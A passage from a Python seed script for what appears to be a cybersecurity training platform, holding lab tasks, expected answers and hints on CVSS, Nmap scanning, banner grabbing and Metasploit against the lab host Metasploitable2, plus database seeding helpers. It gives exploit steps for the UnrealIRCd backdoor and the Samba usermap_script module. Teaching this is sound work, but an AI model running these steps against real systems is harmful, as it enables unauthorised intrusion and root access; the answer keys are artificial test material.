                        "instructions": "Knowing a vulnerability exists is only half the story — you also need to understand **how severe** it is. That's what **CVSS** (Common Vulnerability Scoring System) is for.\n\nCVSS rates vulnerabilities on a **0.0 – 10.0 scale** based on factors like:\n- **Attack Vector** — Network, adjacent, local, or physical?\n- **Attack Complexity** — Is it easy or hard to exploit?\n- **Privileges Required** — Does the attacker need existing credentials?\n- **Impact** — How badly is confidentiality, integrity, or availability affected?\n\n**CVSS severity ranges:**\n\n| Score   | Severity |\n|---------|----------|\n| 0.0     | None     |\n| 0.1–3.9 | Low      |\n| 4.0–6.9 | Medium   |\n| 7.0–8.9 | High     |\n| 9.0–10.0 | **Critical** |\n\nThe vulnerabilities in Metasploitable2 include several **Critical (9.0+)** CVEs — you will exploit two of them in this course.\n\nWhat does **CVSS** stand for?",
                        "expected_answer": "Common Vulnerability Scoring System",
                        "autosolve_commands": [],
                        "sort_order": 4,
                        "hints": [
                            {"text": "CVSS scores of 9–10 are labelled 'Critical'.", "order": 1, "delay": 0},
                            {"text": "Four words: Common, Vulnerability, Scoring, System.", "order": 2, "delay": 0},
                        ],
                    },
                ],
            },
            {
                "title": "Network Reconnaissance with Nmap",
                "description": "Launch Nmap against Metasploitable2 to discover all open ports and identify running services with version detection. This is the reconnaissance phase of a real penetration test.",
                "difficulty": "intermediate",
                "has_auto_solve": True,
                "max_duration_minutes": 120,
                "sort_order": 2,
                "is_published": True,
                "docker_compose_config": {"runtime_slug": "metasploit", "terminal_type": "single"},
                "tasks": [
                    {
                        "title": "How many open TCP ports does Metasploitable2 have?",
                        "instructions": "**Nmap** (Network Mapper) is the most widely used port scanner in the world. It discovers live hosts, open ports, running services, and operating systems across a network.\n\n**Launch your terminal** by clicking **Launch Machine** below, then try your first scan:\n\n```\nnmap --open -T4 metasploitable2\n```\n\n**What these flags mean:**\n- `--open` — only show ports that are open (filters out closed/filtered)\n- `-T4` — aggressive timing (faster scan, fine in a lab)\n- `metasploitable2` — the target hostname (resolvable inside this lab network)\n\nYou should see a list of open TCP ports. Count them up — Metasploitable2 is intentionally vulnerable and exposes many services.\n\n**How many open TCP ports** does the default Nmap scan find?",
                        "expected_answer": "11",
                        "autosolve_commands": ["nmap --open -T4 metasploitable2 2>/dev/null", "nmap --open -T4 metasploitable2 2>/dev/null | grep -c '^[0-9]*/tcp'"],
                        "sort_order": 0,
                        "hints": [
                            {"text": "Use the `--open` flag so only open ports are shown.", "order": 1, "delay": 0},
                            {"text": "Pipe through `grep -c '^[0-9]*/tcp'` to count the lines automatically.", "order": 2, "delay": 0},
                        ],
                    },
                    {
                        "title": "What SSH version is running on port 22?",
                        "instructions": "A basic port scan tells you which ports are open, but not what software is running on them. The **`-sV` flag** (service version detection) makes Nmap probe each open port and identify the exact software and version.\n\nRun this command in your terminal:\n\n```\nnmap -sV -p 22 metasploitable2\n```\n\n**What `-sV -p 22` means:**\n- `-sV` — enable service/version detection\n- `-p 22` — scan only port 22 (SSH)\n\nIn the output, look for a line like:\n```\n22/tcp  open  ssh   <software> <version>\n```\n\nKnowing the exact SSH version is important — older versions have known exploits. For example, **OpenSSH 4.7** was released in 2007 and has several vulnerabilities.\n\nWhat is the **SSH software and version** running on port 22? (format: `OpenSSH X.Yp1`)",
                        "expected_answer": "OpenSSH 4.7p1",
                        "autosolve_commands": ["nmap -sV -p 22 metasploitable2 2>/dev/null | grep '22/tcp'", "nmap -sV -p 22 metasploitable2 2>/dev/null | grep -oP 'OpenSSH [0-9.p]+'"],
                        "sort_order": 1,
                        "hints": [
                            {"text": "Use `nmap -sV -p 22 metasploitable2` to scan just port 22.", "order": 1, "delay": 0},
                            {"text": "The answer format is 'OpenSSH X.Yp1' — include the 'p1' suffix.", "order": 2, "delay": 0},
                        ],
                    },
                    {
                        "title": "What web server is running on port 80?",
                        "instructions": "Port 80 is the default port for HTTP (unencrypted web traffic). Identifying the web server software and version is a key step — different versions have different vulnerabilities.\n\nRun:\n```\nnmap -sV -p 80 metasploitable2\n```\n\nIn the output, look for the `80/tcp` line. The web server name and version will appear after the protocol label.\n\n**Why this matters:** Apache httpd 2.2.8 was released in 2008. Older Apache versions can be vulnerable to path traversal, buffer overflows, and configuration weaknesses. Metasploitable2 intentionally runs old, vulnerable software.\n\nWhat is the **web server software and version** on port 80? (format: `Apache httpd X.Y.Z`)",
                        "expected_answer": "Apache httpd 2.2.8",
                        "autosolve_commands": ["nmap -sV -p 80 metasploitable2 2>/dev/null | grep '80/tcp'", "nmap -sV -p 80 metasploitable2 2>/dev/null | grep -oP 'Apache httpd [0-9.]+'"],
                        "sort_order": 2,
                        "hints": [
                            {"text": "Use `nmap -sV -p 80 metasploitable2` to scan port 80.", "order": 1, "delay": 0},
                            {"text": "The answer starts with 'Apache httpd' followed by the version number.", "order": 2, "delay": 0},
                        ],
                    },
                    {
                        "title": "What MySQL version is running on port 3306?",
                        "instructions": "Now scan the database port. MySQL is one of the most common database servers, and knowing its version helps identify applicable exploits.\n\n```\nnmap -sV -p 3306 metasploitable2\n```\n\nLook for the `3306/tcp` line. You will see the MySQL version reported by Nmap's service probes.\n\n**Why this matters:** MySQL 5.0.x has several known vulnerabilities including privilege escalation and information disclosure issues. In real engagements, a discovered database port is always a high-priority target.\n\nWhat is the **MySQL version** on port 3306? (format: `MySQL X.Y.ZZ`)",
                        "expected_answer": "MySQL 5.0.51a",
                        "autosolve_commands": ["nmap -sV -p 3306 metasploitable2 2>/dev/null | grep '3306/tcp'", "nmap -sV -p 3306 metasploitable2 2>/dev/null | grep -oP 'MySQL [0-9.a]+'"],
                        "sort_order": 3,
                        "hints": [
                            {"text": "Use `nmap -sV -p 3306 metasploitable2`.", "order": 1, "delay": 0},
                            {"text": "The version starts with `5.0` and has a letter suffix.", "order": 2, "delay": 0},
                        ],
                    },
                    {
                        "title": "What IRC service is running on port 6667?",
                        "instructions": "Port 6667 is the default port for **IRC (Internet Relay Chat)** — a protocol from the 1980s still used today. Metasploitable2 runs a specific IRC server on this port that contains a **critical backdoor vulnerability** (CVE-2010-2075).\n\nScan it:\n```\nnmap -sV -p 6667 metasploitable2\n```\n\nLook for the service name on the `6667/tcp` line.\n\n**Background:** In 2009, an attacker compromised the UnrealIRCd source code distribution server and inserted a backdoor. Anyone who downloaded that version unknowingly ran malicious code. This is called a **supply-chain attack** — the software itself was weaponised before distribution.\n\nWe will exploit this backdoor in a later lab using Metasploit's `exploit/unix/irc/unreal_ircd_3281_backdoor` module.\n\nWhat is the **IRC service name** running on port 6667?",
                        "expected_answer": "UnrealIRCd",
                        "autosolve_commands": ["nmap -sV -p 6667 metasploitable2 2>/dev/null | grep '6667/tcp'", "nmap -sV -p 6667 metasploitable2 2>/dev/null | grep -oP 'UnrealIRCd'"],
                        "sort_order": 4,
                        "hints": [
                            {"text": "The service has a known backdoor vulnerability (CVE-2010-2075).", "order": 1, "delay": 0},
                            {"text": "The answer is a single word.", "order": 2, "delay": 0},
                        ],
                    },
                ],
            },
            {
                "title": "Service Enumeration & Banner Grabbing",
                "description": "Go deeper into discovered services using curl and Nmap banner grabbing to extract PHP version, web titles, VNC protocol, Samba version, and identify exploitable vulnerabilities.",
                "difficulty": "intermediate",
                "has_auto_solve": True,
                "max_duration_minutes": 120,
                "sort_order": 3,
                "is_published": True,
                "docker_compose_config": {"runtime_slug": "metasploit", "terminal_type": "single"},
                "tasks": [
                    {
                        "title": "What PHP version is the web server running?",
                        "instructions": "HTTP response headers often leak server-side technology information — a goldmine for attackers during enumeration. The `curl -I` command fetches **only the headers** (no body), quickly revealing web server details.\n\nRun in your terminal:\n```\ncurl -s -I http://metasploitable2/\n```\n\nScan through the headers. You are looking for the **`X-Powered-By`** header, which web applications use to advertise the scripting language they run on.\n\n**Example header output:**\n```\nHTTP/1.1 200 OK\nServer: Apache/2.2.8 (Ubuntu)\nX-Powered-By: PHP/x.x.x\n```\n\nWhat is the **full value** of the `X-Powered-By` header? (format: `PHP/X.Y.Z-...`)",
                        "expected_answer": "PHP/5.2.4-2ubuntu5.10",
                        "autosolve_commands": ["curl -s -I http://metasploitable2/ 2>/dev/null | grep -i 'X-Powered-By'", "curl -s -I http://metasploitable2/ 2>/dev/null | grep -oP 'PHP/[0-9.\\-a-z]+'"],
                        "sort_order": 0,
                        "hints": [
                            {"text": "Use `curl -I http://metasploitable2/` to fetch HTTP headers only.", "order": 1, "delay": 0},
                            {"text": "Look for the `X-Powered-By` header — it contains the PHP version.", "order": 2, "delay": 0},
                        ],
                    },
                    {
                        "title": "What is the title of the Metasploitable2 web page?",
                        "instructions": "The HTML `<title>` tag contains the page title shown in the browser tab. For enumeration, it confirms you've reached the right target and can reveal application names or environments.\n\nFetch the page source and extract the title:\n```\ncurl -s http://metasploitable2/ | grep -oP '(?<=<title>)[^<]+'\n```\n\n**What this command does:**\n- `curl -s http://metasploitable2/` — silently fetch the HTML\n- `grep -oP '(?<=<title>)[^<]+'` — extract only the text between `<title>` and `</title>`\n\nWhat is the **exact page title** of the Metasploitable2 default web page?",
                        "expected_answer": "Metasploitable2 - Linux",
                        "autosolve_commands": ["curl -s http://metasploitable2/ 2>/dev/null | grep -oP '(?<=<title>)[^<]+'"],
                        "sort_order": 1,
                        "hints": [
                            {"text": "Use `curl -s http://metasploitable2/` to get the page source.", "order": 1, "delay": 0},
                            {"text": "The title is inside an HTML `<title>` tag.", "order": 2, "delay": 0},
                        ],
                    },
                    {
                        "title": "What VNC protocol version is running on port 5900?",
                        "instructions": "**VNC (Virtual Network Computing)** enables remote desktop access. Port 5900 is the standard VNC port. If VNC is exposed without authentication (or with a weak password), an attacker can take full graphical control of the machine.\n\nScan it with Nmap:\n```\nnmap -sV -p 5900 metasploitable2\n```\n\nThe output will identify the VNC software and the **protocol version** it supports. Older protocol versions (like 3.3) offer weaker security.\n\nWhat is the VNC service description on port 5900? (format: `VNC (protocol X.X)`)",
                        "expected_answer": "VNC (protocol 3.3)",
                        "autosolve_commands": ["nmap -sV -p 5900 metasploitable2 2>/dev/null | grep '5900/tcp'", "nmap -sV -p 5900 metasploitable2 2>/dev/null | grep -oP 'VNC \\(protocol [0-9.]+\\)'"],
                        "sort_order": 2,
                        "hints": [
                            {"text": "Use `nmap -sV -p 5900 metasploitable2`.", "order": 1, "delay": 0},
                            {"text": "The answer includes 'protocol' in parentheses — e.g., `VNC (protocol X.X)`.", "order": 2, "delay": 0},
                        ],
                    },
                    {
                        "title": "What Samba version range is advertised on port 445?",
                        "instructions": "**Samba** implements the SMB (Server Message Block) protocol on Linux, allowing Windows-style file and printer sharing. Port 445 is the primary SMB port.\n\nMetasploitable2 runs an ancient version of Samba that is vulnerable to **CVE-2007-2447**, a critical remote code execution vulnerability known as the **\"username map script\"** exploit — one of the easiest exploits in Metasploit.\n\nScan port 445:\n```\nnmap -sV -p 445 metasploitable2\n```\n\nNmap will report a version range for the Samba service on this port.\n\nWhat is the **Samba version range** reported by Nmap? (format: `Samba smbd X.X - Y.Y`)",
                        "expected_answer": "Samba smbd 3.X - 4.X",
                        "autosolve_commands": ["nmap -sV -p 445 metasploitable2 2>/dev/null | grep '445/tcp'", "nmap -sV -p 445 metasploitable2 2>/dev/null | grep -oP 'Samba smbd [0-9X. -]+'"],
                        "sort_order": 3,
                        "hints": [
                            {"text": "Use `nmap -sV -p 445 metasploitable2`.", "order": 1, "delay": 0},
                            {"text": "The answer is in the format `Samba smbd X.X - Y.Y` using 'X' for the major version placeholders.", "order": 2, "delay": 0},
                        ],
                    },
                    {
                        "title": "What type of vulnerability affects UnrealIRCd on Metasploitable2?",
                        "instructions": "Now that you have identified UnrealIRCd on port 6667, let's understand the vulnerability.\n\n**CVE-2010-2075** is a supply-chain attack: in 2009, an attacker compromised the UnrealIRCd distribution server and inserted malicious code into the source tarball. The backdoor allows **remote command execution** — an attacker can send a specially crafted string to port 6667 that triggers the execution of arbitrary OS commands with the privileges of the IRC server process.\n\n**Attack flow:**\n1. Connect to port 6667\n2. Send: `AB;` followed by a shell command\n3. The backdoor executes the command on the server\n\nThis vulnerability has a Metasploit module (`exploit/unix/irc/unreal_ircd_3281_backdoor`) that automates the entire attack. You will use it in the next lab.\n\nWhat type of vulnerability is CVE-2010-2075 classified as? Enter: **backdoor command execution**",
                        "expected_answer": "backdoor command execution",
                        "autosolve_commands": [],
                        "sort_order": 4,
                        "hints": [
                            {"text": "This was a supply-chain attack — malicious code was inserted into a legitimate release.", "order": 1, "delay": 0},
                            {"text": "The answer is three words describing what the backdoor does.", "order": 2, "delay": 0},
                        ],
                    },
                ],
            },
            {
                "title": "Exploitation with Metasploit",
                "description": "Learn the Metasploit workflow: search, use, set, info, run. Identify the exact exploit modules for UnrealIRCd (CVE-2010-2075) and Samba (CVE-2007-2447) ready to fire in your next session.",
                "difficulty": "intermediate",
                "has_auto_solve": True,
                "max_duration_minutes": 120,
                "sort_order": 4,
                "is_published": True,
                "docker_compose_config": {"runtime_slug": "metasploit", "terminal_type": "single"},
                "tasks": [
                    {
                        "title": "What is the msfconsole command to select a module?",
                        "instructions": "You have identified two critical vulnerabilities on Metasploitable2:\n- **CVE-2010-2075** — UnrealIRCd backdoor (port 6667)\n- **CVE-2007-2447** — Samba username map script (port 445)\n\nNow it's time to exploit them using **Metasploit**.\n\n**The core Metasploit workflow:**\n\n```\n# 1. Search for the module\nsearch unreal_ircd\n\n# 2. Select it\nuse exploit/unix/irc/unreal_ircd_3281_backdoor\n\n# 3. Configure it\nset RHOSTS metasploitable2\nset LHOST <your IP>\n\n# 4. Verify options\nshow options\n\n# 5. Launch\nrun\n```\n\nThe command used in **step 2** — selecting a module — is a single word followed by the full module path.\n\nWhat is the **msfconsole command** used to select a module? (single word)",
                        "expected_answer": "use",
                        "autosolve_commands": [],
                        "sort_order": 0,
                        "hints": [
                            {"text": "After this command you type the full module path, e.g. `use exploit/unix/irc/unreal_ircd_3281_backdoor`.", "order": 1, "delay": 0},
                        ],
                    },
                    {
                        "title": "What Metasploit option sets the target IP?",
                        "instructions": "Every Metasploit exploit requires at minimum two pieces of information: the **target** (remote host) and your **listener** (local host). These are set as module options.\n\n**Key options in most exploits:**\n\n| Option   | Meaning                        |\n|----------|-------------------------------|\n| `RHOSTS` | Remote host(s) — the target   |\n| `RPORT`  | Remote port — target's port   |\n| `LHOST`  | Local host — your IP          |\n| `LPORT`  | Local port — your listener    |\n\nYou configure these with `set <OPTION> <value>`:\n```\nset RHOSTS metasploitable2\nset LHOST 0.0.0.0\n```\n\nAfter setting options you can verify them with `show options` — this lists required and optional settings and whether they are configured.\n\nWhat is the **option name** used to specify the **target IP address**?",
                        "expected_answer": "RHOSTS",
                        "autosolve_commands": [],
                        "sort_order": 1,
                        "hints": [
                            {"text": "The option name starts with R (for Remote).", "order": 1, "delay": 0},
                            {"text": "LHOST is your attacker IP; the *remote* host option starts with RH.", "order": 2, "delay": 0},
                        ],
                    },
                    {
                        "title": "What msfconsole command shows module details?",
                        "instructions": "Before running an exploit it is good practice to read its documentation. Metasploit includes detailed information for every module including:\n- A description of the vulnerability it exploits\n- The CVE references\n- Required and optional options\n- Author and reliability rating\n\nYou access this with a single-word command inside msfconsole (after selecting a module with `use`):\n\n```\nuse exploit/unix/irc/unreal_ircd_3281_backdoor\ninfo\n```\n\nThe output will show you everything about the module — including that this exploit targets **CVE-2010-2075** and reliably gives a shell on the target.\n\nWhat single-word msfconsole command **shows detailed module information**?",
                        "expected_answer": "info",
                        "autosolve_commands": [],
                        "sort_order": 2,
                        "hints": [
                            {"text": "It's a common English word meaning 'information'.", "order": 1, "delay": 0},
                        ],
                    },
                    {
                        "title": "What Metasploit module exploits the UnrealIRCd backdoor?",
                        "instructions": "Now search for the UnrealIRCd exploit module. Inside msfconsole, run:\n\n```\nsearch unreal_ircd\n```\n\nYou will see a table of matching modules. Find the **exploit** module (not auxiliary or post) that targets the UnrealIRCd backdoor. The module path follows the Metasploit naming convention:\n\n```\n<type>/<platform>/<service>/<module_name>\n```\n\nFor example: `exploit/unix/irc/<name>`\n\n**Auto-Solve note:** The auto-solve will run this search in your terminal and extract the module path automatically.\n\nWhat is the **full module path** for the UnrealIRCd backdoor exploit?",
                        "expected_answer": "exploit/unix/irc/unreal_ircd_3281_backdoor",
                        "autosolve_commands": ["msfconsole -q -x 'search unreal_ircd; exit' 2>/dev/null | grep unreal_ircd | grep exploit | awk '{print $2}'"],
                        "sort_order": 3,
                        "hints": [
                            {"text": "Run `search unreal_ircd` inside msfconsole.", "order": 1, "delay": 0},
                            {"text": "The module path follows: `exploit/unix/irc/<name>`.", "order": 2, "delay": 0},
                        ],
                    },
                    {
                        "title": "What Metasploit module exploits the Samba vulnerability?",
                        "instructions": "The second critical vulnerability is in Samba — **CVE-2007-2447**, known as the \"username map script\" vulnerability. It allows unauthenticated remote code execution by injecting shell commands into the Samba username field.\n\nSearch for it in msfconsole:\n```\nsearch usermap_script\n```\n\nFind the **exploit** module in the results. The module path follows the pattern:\n```\nexploit/multi/samba/<name>\n```\n\nOnce you find it, you can exploit Metasploitable2's Samba service with just three commands:\n```\nuse exploit/multi/samba/usermap_script\nset RHOSTS metasploitable2\nrun\n```\n\nThis gives you a **root shell** — no password required. That's the power (and danger) of unpatched, vulnerable services.\n\nWhat is the **full module path** for the Samba usermap_script exploit?",
                        "expected_answer": "exploit/multi/samba/usermap_script",
                        "autosolve_commands": ["msfconsole -q -x 'search usermap_script; exit' 2>/dev/null | grep usermap_script | grep exploit | awk '{print $2}'"],
                        "sort_order": 4,
                        "hints": [
                            {"text": "Run `search usermap_script` inside msfconsole.", "order": 1, "delay": 0},
                            {"text": "The module path starts with `exploit/multi/samba/`.", "order": 2, "delay": 0},
                        ],
                    },
                ],
            },
        ],
    },
]


# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

async def ensure_tables() -> None:
    """Create all SQLAlchemy tables if they don't exist yet."""
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)
    print("[seed] Tables verified / created.")


async def ensure_admin(db) -> User:
    """Return the seeded admin user, creating it if needed."""
    if not ADMIN_EMAIL or not ADMIN_PASSWORD:
        raise RuntimeError(
            "CYBERARCADE_ADMIN_EMAIL and CYBERARCADE_ADMIN_PASSWORD must be set before seeding the admin account."
        )
    result = await db.execute(select(User).where(User.email == ADMIN_EMAIL))
    admin = result.scalar_one_or_none()
    if admin:
        print(f"[seed] Admin already exists: {ADMIN_EMAIL}")
        return admin

    admin = User(
        full_name=ADMIN_NAME,
        email=ADMIN_EMAIL,
        password_hash=hash_password(ADMIN_PASSWORD),
        role="admin",
        is_active=True,
        email_verified=True,
    )
    db.add(admin)
    await db.flush()
    print(f"[seed] Created admin: {ADMIN_EMAIL}")
    return admin


async def seed_course(db, course_data: dict, admin: User, force: bool) -> None:
    title = course_data["title"]

    result = await db.execute(select(Course).where(Course.title == title))
    existing = result.scalar_one_or_none()

    if existing:
        if not force:
            print(f"[skip] '{title}' already exists (id={existing.course_id})")
            return
        print(f"[force] Deleting '{title}' and re-seeding...")
        await db.delete(existing)
        await db.commit()

    course = Course(
        created_by=admin.user_id,
        title=title,
        description=course_data["description"],
        difficulty_level=course_data["difficulty_level"],
        category=course_data["category"],
        estimated_hours=course_data["estimated_hours"],
        is_published=course_data.get("is_published", True),
    )
    db.add(course)
    await db.flush()

    total_tasks = 0
    for lab_data in course_data.get("labs", []):
        lab = Lab(
            course_id=course.course_id,
            title=lab_data["title"],
            description=lab_data["description"],
            difficulty=lab_data["difficulty"],
            docker_compose_config=lab_data.get("docker_compose_config", {}),
            has_auto_solve=lab_data.get("has_auto_solve", False),
            max_duration_minutes=lab_data.get("max_duration_minutes"),
            sort_order=lab_data["sort_order"],
            is_published=lab_data.get("is_published", True),
        )
        db.add(lab)
        await db.flush()

        for task_data in lab_data.get("tasks", []):
            task = LabTask(
                lab_id=lab.lab_id,
                title=task_data["title"],
                instructions=task_data["instructions"],
                expected_answer=task_data.get("expected_answer"),
                autosolve_commands=task_data.get("autosolve_commands", []),
                sort_order=task_data["sort_order"],
            )
            db.add(task)
            await db.flush()
            total_tasks += 1

            for hint_data in task_data.get("hints", []):
                db.add(Hint(
                    task_id=task.task_id,
                    hint_text=hint_data["text"],
                    hint_order=hint_data["order"],
                    delay_minutes=hint_data.get("delay", 0),
                ))

        await db.flush()

    await db.commit()
    lab_count = len(course_data.get("labs", []))
    print(f"[seed] '{title}': {lab_count} labs, {total_tasks} tasks  (id={course.course_id})")


# ─────────────────────────────────────────────────────────────────────────────
# Entry point
# ─────────────────────────────────────────────────────────────────────────────

async def main() -> None:
    force = "--force" in sys.argv

    print("=" * 60)
    print("CyberArcade — seed_all.py")
    print("=" * 60)

    await ensure_tables()

    async with async_session() as db:
        admin = await ensure_admin(db)
        await db.commit()

        for course_data in ALL_COURSES:
            await seed_course(db, course_data, admin, force=force)

    # Gamification: levels + badges
    from seeds.seed_gamification import main as seed_gamification
    await seed_gamification()

    print("=" * 60)
    print("[seed] All done.")
    print("=" * 60)


if __name__ == "__main__":
    asyncio.run(main())
